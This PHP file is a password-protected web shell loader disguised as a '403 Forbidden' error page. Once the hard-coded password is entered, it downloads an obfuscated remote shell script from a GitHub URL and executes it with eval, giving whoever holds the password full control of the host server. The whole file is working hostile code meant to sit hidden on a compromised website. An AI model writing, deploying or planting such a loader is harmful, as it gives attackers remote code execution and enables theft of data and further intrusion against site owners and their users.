<?php
session_start();

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION['SAP'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
        }
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

function is_logged_in() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

$show_error = false;
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = 'd445787e69e2ed520062327d172109b9'; // md5('48')
    if (md5($entered_password) === $hashed_password) {
        $_SESSION['logged_in'] = true;
        $_SESSION['SAP'] = 'janco';
    } else {
        $show_error = true;
    }
}

if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/nicxlau/alfa-shell/refs/heads/master/alfa-obfuscated.php');
    eval('?>' . $a);
} else {
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>403 Forbidden Access</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #1e003d;
      color: #ffcc00;
      font-family: 'Courier New', Courier, monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-image: url('https://www.transparenttextures.com/patterns/dark-mosaic.png');
      background-size: cover;
    }

    .container {
      background-color: rgba(21, 0, 41, 0.9);
      padding: 40px;
      border: 2px solid #ffcc00;
      border-radius: 8px;
      text-align: left;
      box-shadow: 0 0 25px #a832ff;
      width: 90%;
      max-width: 500px;
      position: relative;
    }

    .code-large {
      font-size: 100px;
      color: rgba(255, 255, 255, 0.05);
      position: absolute;
      top: -30px;
      left: 10px;
      z-index: 0;
    }

    h1 {
      margin-bottom: 15px;
      font-size: 26px;
      z-index: 1;
      position: relative;
    }

    p {
      font-size: 14px;
      margin-bottom: 25px;
      line-height: 1.5;
      z-index: 1;
      position: relative;
    }

    input[type="password"],
    input[type="text"] {
      padding: 10px;
      width: 100%;
      background-color: #1c0033;
      color: #ffcc00;
      border: 1px solid #ffcc00;
      border-radius: 4px;
      margin-bottom: 20px;
      font-size: 16px;
      z-index: 1;
      position: relative;
    }

    input[type="submit"] {
      padding: 10px 20px;
      background-color: #ffcc00;
      color: #1c0033;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      z-index: 1;
      position: relative;
    }

    input[type="submit"]:hover {
      background-color: #d4a900;
    }

    .glow {
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 5px #a832ff; }
      50% { box-shadow: 0 0 20px #a832ff; }
      100% { box-shadow: 0 0 5px #a832ff; }
    }

    .error-message {
      margin-top: 20px;
      font-size: 16px;
      color: #ff5555;
      animation: blink 1.5s infinite;
      font-weight: bold;
      text-align: center;
    }

    @keyframes blink {
      0%, 100% { opacity: 0; }
      50% { opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="container glow">
    <div class="code-large">403</div>
    <h1>ACCESS DENIED</h1>
    <p>> ERROR CODE: <strong>403 Forbidden</strong><br>
    > You do not have permission to access this portal.<br>
    > This incident has been logged.</p>
    <form method="POST" action="">
      <label for="password">Access Team PJP :</label><br><br>
      <input type="password" id="password" name="password" placeholder="Enter your code">
      <input type="submit" value="LOGIN">
    </form>

    <?php if ($show_error): ?>
      <div class="error-message">😜 Maaf Anda Kurang Profesional. Silahkan Coba Lagi. 😏</div>
    <?php endif; ?>
  </div>

  <script>
    const passwordInput = document.getElementById('password');
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Tab') {
        e.preventDefault();
        passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
      }
    });
    passwordInput.addEventListener('blur', function() {
      passwordInput.type = 'password';
    });
  </script>
</body>
</html>
<?php } ?>
